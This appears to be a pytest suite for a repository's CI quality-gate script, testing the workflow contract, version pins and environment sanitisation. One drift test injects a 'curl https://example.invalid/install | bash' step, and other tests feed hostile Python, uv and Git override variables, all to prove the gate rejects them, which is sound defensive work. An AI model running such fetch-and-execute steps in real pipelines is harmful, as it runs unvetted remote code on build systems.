"""Offline regression tests for the canonical repository quality gate."""

from __future__ import annotations

import os
import re
import shutil
import subprocess
import sys
import textwrap
from dataclasses import dataclass
from pathlib import Path
from typing import Any

import pytest
import yaml


REPO_ROOT = Path(__file__).resolve().parents[2]
QUALITY_WORKFLOW = REPO_ROOT / ".github" / "workflows" / "quality.yml"


def _assert_quality_workflow_contract(source: str) -> None:
    workflow: dict[str, Any] = yaml.load(source, Loader=yaml.BaseLoader)
    assert workflow == {
        "name": "Quality",
        "on": {
            "pull_request": "",
            "push": {"branches": ["main"]},
            "workflow_dispatch": "",
        },
        "permissions": {"contents": "read"},
        "concurrency": {
            "group": "quality-${{ github.workflow }}-${{ github.head_ref || github.ref }}",
            "cancel-in-progress": "true",
        },
        "jobs": {
            "quality": {
                "name": "quality",
                "runs-on": "ubuntu-24.04",
                "timeout-minutes": "15",
                "steps": [
                    {
                        "name": "Check out source",
                        "uses": "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd",
                        "with": {
                            "fetch-depth": "0",
                            "persist-credentials": "false",
                        },
                    },
                    {
                        "name": "Install uv and Python",
                        "uses": "astral-sh/setup-uv@08807647e7069bb48b6ef5acd8ec9567f424441b",
                        "with": {
                            "version": "0.11.32",
                            "python-version": "3.12.13",
                            "enable-cache": "true",
                        },
                    },
                    {
                        "name": "Install Docker Compose",
                        "uses": "docker/setup-compose-action@4eb059ff7f16592f9c84d5ca339c53cb7c5064e2",
                        "with": {"version": "v2.40.3"},
                    },
                    {
                        "name": "Run quality gate",
                        "env": {"WETHR_DIFF_BASE": "${{ github.event.pull_request.base.sha || '' }}"},
                        "run": "./scripts/check",
                    },
                ],
            }
        },
    }


CHECK_SCRIPT = REPO_ROOT / "scripts" / "check"


def _run_bash_function(function: str, *arguments: str) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        [
            "bash",
            "-c",
            'source "$1"; shift; "$@"',
            "bash",
            str(CHECK_SCRIPT),
            function,
            *arguments,
        ],
        check=False,
        capture_output=True,
        text=True,
    )


@pytest.mark.parametrize(
    ("value", "accepted"),
    [
        ("0", True),
        ("0" * 40, True),
        ("0" * 64, True),
        ("", False),
        ("0001000", False),
        ("f" * 40, False),
    ],
)
def test_zero_sha_classifier(value: str, accepted: bool) -> None:
    result = _run_bash_function("is_zero_sha", value)
    assert (result.returncode == 0) is accepted


@pytest.mark.parametrize(
    ("path", "accepted"),
    [
        ("compose.yml", True),
        ("compose.yaml", True),
        ("docker-compose.yml", True),
        ("docker-compose.yaml", True),
        ("nested/staging/docker-compose.yaml", True),
        ("nested/compose.yaml.disabled", False),
        ("docker_compose.yml", False),
        ("compose.json", False),
    ],
)
def test_compose_path_classifier(path: str, accepted: bool) -> None:
    result = _run_bash_function("is_compose_file", path)
    assert (result.returncode == 0) is accepted


@pytest.mark.parametrize(
    ("function", "path", "accepted"),
    [
        ("is_workflow_json_file", "n8n-wethr/workflows/audit.json", True),
        ("is_workflow_json_file", "n8n-wethr/workflows/nested/audit.json", True),
        ("is_workflow_json_file", "n8n-wethr/workflows/.json", False),
        ("is_workflow_json_file", "other/workflows/audit.json", False),
        ("is_systemd_unit_file", "deploy/systemd/wethr.service", True),
        ("is_systemd_unit_file", "deploy/systemd/staging/wethr.timer", True),
        ("is_systemd_unit_file", "deploy/systemd/.service", False),
        ("is_systemd_unit_file", "deploy/systemd/wethr.socket", False),
        ("is_quality_workflow_file", ".github/workflows/quality.yml", True),
        ("is_quality_workflow_file", ".github/workflows/quality.yaml", False),
    ],
)
def test_tracked_path_classifiers(function: str, path: str, accepted: bool) -> None:
    result = _run_bash_function(function, path)
    assert (result.returncode == 0) is accepted


@pytest.mark.parametrize(
    ("function", "output", "expected"),
    [
        ("extract_uv_version", "uv 0.11.32 (x86_64-unknown-linux-gnu)", "0.11.32"),
        ("extract_uv_version", "uv 0.11.320", "0.11.320"),
        ("extract_compose_version", "Docker Compose version v2.40.3", "2.40.3"),
        (
            "extract_compose_version",
            "Docker Compose version 2.40.3+ds1-0ubuntu1~24.04.1",
            "2.40.3",
        ),
        ("extract_compose_version", "Docker Compose version 2.40.30", "2.40.30"),
        ("extract_systemd_major", "systemd 255 (255.4-1ubuntu8.16)\n+PAM", "255"),
        ("extract_systemd_major", "systemd 255.4", "255"),
        ("extract_systemd_major", "systemd 258 (258.1)", "258"),
    ],
)
def test_version_parsers(function: str, output: str, expected: str) -> None:
    result = _run_bash_function(function, output)
    assert result.returncode == 0, result.stderr
    assert result.stdout.strip() == expected


@pytest.mark.parametrize(
    ("function", "output"),
    [
        ("extract_uv_version", "uv"),
        ("extract_uv_version", "not-uv 0.11.32"),
        ("extract_compose_version", "compose 2.40.3"),
        ("extract_compose_version", "Docker Compose version release"),
        ("extract_systemd_major", "255 systemd"),
    ],
)
def test_version_parsers_reject_unrecognized_output(function: str, output: str) -> None:
    result = _run_bash_function(function, output)
    assert result.returncode != 0


def test_require_command_reports_a_missing_tool() -> None:
    result = _run_bash_function(
        "require_command",
        "wethr-command-that-does-not-exist",
        "install the fixture tool",
    )
    assert result.returncode != 0
    assert "required command 'wethr-command-that-does-not-exist' was not found" in result.stderr
    assert "install the fixture tool" in result.stderr


def test_unit_path_rewrite_is_exact() -> None:
    result = _run_bash_function(
        "rewrite_unit_line",
        "ExecStart=%h/projects/wethr/collector/run.py --note projects/wethr",
        "/tmp/checkout",
    )
    assert result.returncode == 0
    assert result.stdout == (
        "ExecStart=/tmp/checkout/collector/run.py --note projects/wethr\n"
    )


@dataclass
class GateFixture:
    root: Path
    base_sha: str
    fake_bin: Path
    capture_dir: Path

    def git(self, *arguments: str) -> subprocess.CompletedProcess[str]:
        return subprocess.run(
            ["git", "-C", str(self.root), *arguments],
            check=True,
            capture_output=True,
            text=True,
        )

    def run(
        self,
        *arguments: str,
        cwd: Path | None = None,
        environment: dict[str, str] | None = None,
    ) -> subprocess.CompletedProcess[str]:
        env = os.environ.copy()
        env.update(
            {
                "PATH": f"{self.fake_bin}:{env['PATH']}",
                "GATE_ENV_CAPTURE": str(self.capture_dir / "environment"),
                "GATE_UV_CAPTURE": str(self.capture_dir / "uv-commands"),
                "GATE_UNIT_CAPTURE": str(self.capture_dir / "unit-paths"),
                "GATE_PYTHON": sys.executable,
            }
        )
        if environment:
            env.update(environment)
        return subprocess.run(
            [str(self.root / "scripts" / "check"), *arguments],
            cwd=cwd or self.root,
            env=env,
            check=False,
            capture_output=True,
            text=True,
        )


def _write(path: Path, content: str, *, executable: bool = False) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(textwrap.dedent(content).lstrip(), encoding="utf-8")
    if executable:
        path.chmod(0o755)


def _make_gate_fixture(tmp_path: Path) -> GateFixture:
    root = tmp_path / "repo"
    fake_bin = tmp_path / "fake-bin"
    capture_dir = tmp_path / "captures"
    root.mkdir()
    fake_bin.mkdir()
    capture_dir.mkdir()

    (root / "scripts").mkdir()
    shutil.copy2(CHECK_SCRIPT, root / "scripts" / "check")
    (root / "scripts" / "check").chmod(0o755)

    _write(root / "collector" / "src" / "placeholder.py", "VALUE = 1\n")
    _write(root / "collector" / "scripts" / "placeholder.py", "VALUE = 1\n")
    _write(root / "n8n-wethr" / "workflows" / "audit.json", '{"ok": true}\n')
    _write(root / "n8n-wethr" / "docker-compose.yml", "services: {}\n")
    _write(
        root / "deploy" / "systemd" / "wethr.service",
        """
        [Service]
        ExecStart=%h/projects/wethr/collector/run.py
        """,
    )
    _write(
        root / "deploy" / "systemd" / "staging" / "wethr.service",
        """
        [Service]
        ExecStart=%h/projects/wethr/collector/run.py --staging
        """,
    )
    _write(root / ".github" / "workflows" / "quality.yml", "name: fixture\n")
    _write(root / "README.md", "fixture\n")

    _write(
        fake_bin / "uv",
        r"""
        #!/usr/bin/env bash
        set -euo pipefail
        if [[ -n "${GATE_UV_CAPTURE:-}" ]]; then
            printf '%q ' "$@" >>"$GATE_UV_CAPTURE"
            printf '\n' >>"$GATE_UV_CAPTURE"
        fi
        if [[ "${1:-}" == "--version" ]]; then
            printf '%s\n' "${GATE_UV_OUTPUT:-uv ${GATE_UV_VERSION:-0.11.32} (fixture)}"
            exit 0
        fi
        if [[ "${1:-}" == "sync" ]]; then
            [[ "${GATE_FIXTURE_FAIL:-}" != "sync" ]] || exit 9
            exit 0
        fi
        [[ "${1:-}" == "run" ]] || exit 8
        if [[ -n "${GATE_ENV_CAPTURE:-}" ]]; then
            env | sort >"$GATE_ENV_CAPTURE"
        fi
        command_line=" $* "
        if [[ "$command_line" == *"platform.python_version"* ]]; then
            if [[ "${GATE_FIXTURE_FAIL:-}" == "python-runtime" ]]; then
                printf '3.12.12 CPython\n'
            else
                printf '3.12.13 CPython\n'
            fi
            exit 0
        fi
        if [[ "$command_line" == *" python -m pytest "* ]]; then
            [[ "${GATE_FIXTURE_FAIL:-}" != "pytest" ]] || exit 9
            exit 0
        fi
        if [[ "$command_line" == *" python -m compileall "* ]]; then
            [[ "${GATE_FIXTURE_FAIL:-}" != "compile" ]] || exit 9
            exit 0
        fi
        if [[ "$command_line" == *" python -m json.tool "* ]]; then
            "$GATE_PYTHON" -m json.tool "${@: -1}"
            exit $?
        fi
        exit 7
        """,
        executable=True,
    )
    _write(
        fake_bin / "docker",
        r"""
        #!/usr/bin/env bash
        set -euo pipefail
        [[ "${1:-}" == "compose" ]] || exit 8
        if [[ "${2:-}" == "version" ]]; then
            printf '%s\n' "${GATE_COMPOSE_OUTPUT:-Docker Compose version ${GATE_COMPOSE_VERSION:-2.40.3}}"
            exit 0
        fi
        [[ "${GATE_FIXTURE_FAIL:-}" != "compose" ]] || exit 9
        if [[ "${GATE_FIXTURE_FAIL:-}" == "compose-diagnostics" ]]; then
            printf 'fixture Compose diagnostic\n' >&2
            exit 0
        fi
        for argument in "$@"; do
            if [[ -f "$argument" && "$(<"$argument")" == *INVALID_COMPOSE* ]]; then
                exit 9
            fi
        done
        exit 0
        """,
        executable=True,
    )
    _write(
        fake_bin / "systemd-analyze",
        r"""
        #!/usr/bin/env bash
        set -euo pipefail
        if [[ "${1:-}" == "--version" ]]; then
            printf '%s\n' "${GATE_SYSTEMD_OUTPUT:-systemd ${GATE_SYSTEMD_MAJOR:-255} (fixture)}"
            exit 0
        fi
        if [[ -n "${GATE_UNIT_CAPTURE:-}" ]]; then
            printf '%s\n' "$@" >"$GATE_UNIT_CAPTURE"
        fi
        if [[ "${GATE_FIXTURE_FAIL:-}" == "systemd" ]]; then
            printf 'fixture unit failure\n' >&2
            exit 9
        fi
        if [[ "${GATE_FIXTURE_FAIL:-}" == "systemd-diagnostics" ]]; then
            printf 'fixture unit diagnostic\n' >&2
        fi
        exit 0
        """,
        executable=True,
    )

    subprocess.run(
        ["git", "init", "-q", "-b", "main", str(root)],
        check=True,
        capture_output=True,
        text=True,
    )
    fixture = GateFixture(root=root, base_sha="", fake_bin=fake_bin, capture_dir=capture_dir)
    fixture.git("config", "user.name", "Gate Fixture")
    fixture.git("config", "user.email", "gate-fixture@example.invalid")
    fixture.git("add", ".")
    fixture.git("commit", "-qm", "fixture baseline")
    fixture.base_sha = fixture.git("rev-parse", "HEAD").stdout.strip()
    return fixture


@pytest.fixture
def gate_fixture(tmp_path: Path) -> GateFixture:
    return _make_gate_fixture(tmp_path)


def test_fixture_gate_sanitizes_environment_and_preserves_unit_paths(
    gate_fixture: GateFixture,
) -> None:
    result = gate_fixture.run(
        environment={
            "WETHR_DIFF_BASE": gate_fixture.base_sha,
            "WETHR_MIN_EDGE": "0.02",
            "WETHR_MAX_TRADE": "500",
            "WETHR_TELEGRAM_BOT_TOKEN": "must-not-leak",
            "WETHR_FUTURE_SETTING": "must-not-leak",
            "PYTHONBREAKPOINT": "hostile.breakpoint",
            "PYTHONHOME": "/hostile/python-home",
            "PYTHONINSPECT": "1",
            "PYTHONOPTIMIZE": "2",
            "PYTHONPATH": "/hostile/python-path",
            "PYTHONSTARTUP": "/hostile/startup.py",
            "PYTHONWARNINGS": "error",
            "UV_NO_PROJECT": "1",
            "UV_NO_SYNC": "1",
            "UV_PROJECT_ENVIRONMENT": "/hostile/venv",
            "UV_PYTHON": "/hostile/python",
            "UV_PYTHON_PREFERENCE": "only-system",
            "UV_SYSTEM_PYTHON": "1",
            "VIRTUAL_ENV": "/hostile/active-venv",
        }
    )
    assert result.returncode == 0, result.stdout + result.stderr
    assert "check: all checks passed" in result.stdout

    environment_lines = (gate_fixture.capture_dir / "environment").read_text(
        encoding="utf-8"
    ).splitlines()
    captured_environment = dict(line.partition("=")[::2] for line in environment_lines)
    wethr_names = sorted(
        name for name in captured_environment if name.startswith("WETHR_")
    )
    assert wethr_names == ["WETHR_DATA_DIR", "WETHR_DB_PATH", "WETHR_LIVE"]
    assert {
        "PYTHONBREAKPOINT",
        "PYTHONHOME",
        "PYTHONINSPECT",
        "PYTHONOPTIMIZE",
        "PYTHONPATH",
        "PYTHONSTARTUP",
        "PYTHONWARNINGS",
        "UV_NO_PROJECT",
        "UV_NO_SYNC",
        "UV_PYTHON",
        "UV_PYTHON_PREFERENCE",
        "UV_SYSTEM_PYTHON",
        "VIRTUAL_ENV",
    }.isdisjoint(captured_environment)
    assert captured_environment["PYTHONHASHSEED"] == "0"
    assert captured_environment["UV_PROJECT_ENVIRONMENT"] == str(
        gate_fixture.root / "collector" / ".venv"
    )

    uv_commands = (gate_fixture.capture_dir / "uv-commands").read_text(encoding="utf-8")
    run_commands = [line for line in uv_commands.splitlines() if line.startswith("run ")]
    assert run_commands
    assert all("--frozen" in line for line in run_commands)
    assert "sync --locked --python 3.12.13" in uv_commands

    unit_paths = (gate_fixture.capture_dir / "unit-paths").read_text(
        encoding="utf-8"
    ).splitlines()
    verified_units = [path for path in unit_paths if path.endswith(".service")]
    assert len(verified_units) == 2
    assert len(set(verified_units)) == 2
    assert any("deploy/systemd/staging/wethr.service" in path for path in verified_units)


def test_zero_sha_environment_base_falls_back_to_main(
    gate_fixture: GateFixture,
) -> None:
    result = gate_fixture.run(environment={"WETHR_DIFF_BASE": "0" * 40})
    assert result.returncode == 0, result.stdout + result.stderr
    assert "(main)" in result.stdout


def test_untracked_whitespace_uses_repository_configuration(
    gate_fixture: GateFixture,
    tmp_path: Path,
) -> None:
    hostile_cwd = tmp_path / "hostile-caller"
    hostile_cwd.mkdir()
    subprocess.run(
        ["git", "init", "-q", "-b", "main", str(hostile_cwd)],
        check=True,
        capture_output=True,
        text=True,
    )
    subprocess.run(
        ["git", "-C", str(hostile_cwd), "config", "core.whitespace", "-trailing-space,-blank-at-eol"],
        check=True,
    )
    _write(gate_fixture.root / "untracked.txt", "trailing space \n")

    result = gate_fixture.run("--base", gate_fixture.base_sha, cwd=hostile_cwd)

    assert result.returncode != 0, result.stdout
    assert "whitespace errors found in untracked files" in result.stderr


@pytest.mark.parametrize(
    ("scenario", "expected_error"),
    [
        ("sync", "locked Python environment synchronization failed"),
        ("python-runtime", "CPython 3.12.13 is required"),
        ("pytest", "pytest failed"),
        ("compile", "collector byte-compilation failed"),
        ("json", "malformed workflow JSON"),
        ("compose", "invalid Compose configuration"),
        ("compose-diagnostics", "Compose validation reported diagnostics"),
        ("systemd", "systemd unit validation failed"),
        ("systemd-diagnostics", "systemd unit validation reported diagnostics"),
        ("committed-whitespace", "whitespace errors found in committed branch changes"),
        ("staged-whitespace", "whitespace errors found in staged changes"),
        ("unstaged-whitespace", "whitespace errors found in unstaged changes"),
        ("untracked-whitespace", "whitespace errors found in untracked files"),
        ("hostile-git-config", "whitespace errors found in untracked files"),
        ("untracked-inspection", "cannot inspect untracked file for whitespace errors"),
        ("extra-workflow", "unexpected GitHub workflow file(s)"),
        ("missing-json", "no tracked n8n workflow JSON files found"),
        ("missing-compose", "no tracked Compose files found"),
        ("missing-units", "no tracked systemd service or timer units found"),
        ("missing-quality", "required quality workflow"),
        ("uv-version", "uv 0.11.32 is required, but found '0.11.320'"),
        ("compose-version", "Docker Compose 2.40.3 is required, but found '2.40.30'"),
        ("systemd-version", "systemd major 255 is required, but found '258'"),
        ("uv-unparseable", "cannot parse the uv version"),
        ("compose-unparseable", "cannot parse the Docker Compose version"),
        ("systemd-unparseable", "cannot parse the systemd version"),
        ("bad-base", "explicit diff base 'missing-ref' does not resolve to a commit"),
        ("environment-base", "WETHR_DIFF_BASE 'missing-ref' does not resolve to a commit"),
        ("bad-argument", "unknown argument '--unknown'"),
        ("not-worktree", "is not inside a Git worktree"),
    ],
)
def test_gate_deliberate_failures(
    gate_fixture: GateFixture,
    scenario: str,
    expected_error: str,
) -> None:
    environment: dict[str, str] = {}
    arguments = ["--base", gate_fixture.base_sha]

    if scenario in {
        "sync",
        "python-runtime",
        "pytest",
        "compile",
        "compose",
        "compose-diagnostics",
        "systemd",
        "systemd-diagnostics",
    }:
        environment["GATE_FIXTURE_FAIL"] = scenario
    elif scenario == "json":
        _write(gate_fixture.root / "n8n-wethr" / "workflows" / "audit.json", '{"bad": }\n')
    elif scenario == "committed-whitespace":
        _write(gate_fixture.root / "committed.txt", "trailing space \n")
        gate_fixture.git("add", "committed.txt")
        gate_fixture.git("commit", "-qm", "add bad committed whitespace")
    elif scenario == "staged-whitespace":
        _write(gate_fixture.root / "staged.txt", "trailing space \n")
        gate_fixture.git("add", "staged.txt")
    elif scenario == "unstaged-whitespace":
        _write(gate_fixture.root / "README.md", "trailing space \n")
    elif scenario == "untracked-whitespace":
        _write(gate_fixture.root / "untracked.txt", "trailing space \n")
    elif scenario == "hostile-git-config":
        # Git honors whitespace policy from its own environment, so an inherited
        # override must not reach the gate's Git invocations.
        _write(gate_fixture.root / "untracked.txt", "trailing space \n")
        environment.update(
            {
                "GIT_CONFIG_COUNT": "1",
                "GIT_CONFIG_KEY_0": "core.whitespace",
                "GIT_CONFIG_VALUE_0": "-trailing-space,-blank-at-eol",
            }
        )
    elif scenario == "untracked-inspection":
        if os.geteuid() == 0:
            pytest.skip("root bypasses the unreadable-file permission this case relies on")
        unreadable = gate_fixture.root / "unreadable.txt"
        _write(unreadable, "inspect me\n")
        unreadable.chmod(0)
    elif scenario == "extra-workflow":
        _write(
            gate_fixture.root / ".github" / "workflows" / "probe.yml",
            "name: probe\n",
        )
        gate_fixture.git("add", ".github/workflows/probe.yml")
    elif scenario == "missing-json":
        gate_fixture.git("rm", "-q", "n8n-wethr/workflows/audit.json")
    elif scenario == "missing-compose":
        gate_fixture.git("rm", "-q", "n8n-wethr/docker-compose.yml")
    elif scenario == "missing-units":
        gate_fixture.git(
            "rm",
            "-qr",
            "deploy/systemd/wethr.service",
            "deploy/systemd/staging/wethr.service",
        )
    elif scenario == "missing-quality":
        gate_fixture.git("rm", "-q", ".github/workflows/quality.yml")
    elif scenario == "uv-version":
        environment["GATE_UV_VERSION"] = "0.11.320"
    elif scenario == "compose-version":
        environment["GATE_COMPOSE_VERSION"] = "2.40.30"
    elif scenario == "systemd-version":
        environment["GATE_SYSTEMD_MAJOR"] = "258"
    elif scenario == "uv-unparseable":
        environment["GATE_UV_OUTPUT"] = "not a uv version"
    elif scenario == "compose-unparseable":
        environment["GATE_COMPOSE_OUTPUT"] = "not a Compose version"
    elif scenario == "systemd-unparseable":
        environment["GATE_SYSTEMD_OUTPUT"] = "not a systemd version"
    elif scenario == "bad-base":
        arguments = ["--base", "missing-ref"]
    elif scenario == "environment-base":
        arguments = []
        environment["WETHR_DIFF_BASE"] = "missing-ref"
    elif scenario == "bad-argument":
        arguments = ["--unknown"]
    elif scenario == "not-worktree":
        shutil.rmtree(gate_fixture.root / ".git")
    else:  # pragma: no cover - the parameter table defines every scenario
        raise AssertionError(f"unhandled scenario: {scenario}")

    result = gate_fixture.run(*arguments, environment=environment)
    assert result.returncode != 0, result.stdout
    assert expected_error in result.stderr


def test_quality_workflow_preserves_ci_contract() -> None:
    _assert_quality_workflow_contract(QUALITY_WORKFLOW.read_text(encoding="utf-8"))


def test_gate_pins_match_the_ci_workflow() -> None:
    """The same versions are declared in four places; keep them from drifting."""
    workflow: dict[str, Any] = yaml.load(
        QUALITY_WORKFLOW.read_text(encoding="utf-8"), Loader=yaml.BaseLoader
    )
    steps = {step["name"]: step for step in workflow["jobs"]["quality"]["steps"]}
    uv_version = steps["Install uv and Python"]["with"]["version"]
    python_version = steps["Install uv and Python"]["with"]["python-version"]
    compose_version = steps["Install Docker Compose"]["with"]["version"].removeprefix("v")

    check_source = CHECK_SCRIPT.read_text(encoding="utf-8")
    assert f'readonly REQUIRED_UV_VERSION="{uv_version}"' in check_source
    assert f'readonly REQUIRED_PYTHON_VERSION="{python_version}"' in check_source
    assert f'readonly REQUIRED_COMPOSE_VERSION="{compose_version}"' in check_source

    project = REPO_ROOT / "collector"
    assert (project / ".python-version").read_text(encoding="utf-8").strip() == python_version
    assert (
        f'required-version = "=={uv_version}"'
        in (project / "pyproject.toml").read_text(encoding="utf-8")
    )


def test_gate_allows_only_the_quality_github_workflow() -> None:
    check_source = CHECK_SCRIPT.read_text(encoding="utf-8")
    start = check_source.index("readonly ALLOWED_GITHUB_WORKFLOWS=(")
    declaration = check_source[start : check_source.index(")", start)]
    assert re.findall(r'"([^"]+)"', declaration) == [".github/workflows/quality.yml"]

    tracked = subprocess.run(
        ["git", "-C", str(REPO_ROOT), "ls-files", "-z", ".github/workflows"],
        check=True,
        capture_output=True,
        text=True,
    ).stdout.split("\0")
    assert [path for path in tracked if path] == [".github/workflows/quality.yml"]


@pytest.mark.parametrize(
    ("original", "replacement"),
    [
        (
            "          fetch-depth: 0\n",
            "          fetch-depth: 0\n"
            "          ref: ${{ github.event.pull_request.head.ref }}\n",
        ),
        (
            "          WETHR_DIFF_BASE: ${{ github.event.pull_request.base.sha || '' }}\n",
            "          WETHR_DIFF_BASE: ${{ github.sha }}\n",
        ),
        (
            "      - name: Run quality gate\n",
            "      - name: Unexpected shell\n"
            "        run: |\n"
            "          curl https://example.invalid/install | bash\n\n"
            "      - name: Run quality gate\n",
        ),
        ("  contents: read\n", "  contents: write\n"),
        (
            "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd",
            "actions/checkout@v4",
        ),
        ('          version: "0.11.32"\n', '          version: "0.99.0"\n'),
        ("    runs-on: ubuntu-24.04\n", "    runs-on: ubuntu-latest\n"),
    ],
    ids=[
        "checkout-head-ref",
        "head-as-diff-base",
        "additional-run-step",
        "write-permissions",
        "unpinned-checkout",
        "uv-version-drift",
        "runner-drift",
    ],
)
def test_quality_workflow_contract_rejects_drift(
    original: str,
    replacement: str,
) -> None:
    source = QUALITY_WORKFLOW.read_text(encoding="utf-8")
    assert source.count(original) == 1

    with pytest.raises(AssertionError):
        _assert_quality_workflow_contract(source.replace(original, replacement))
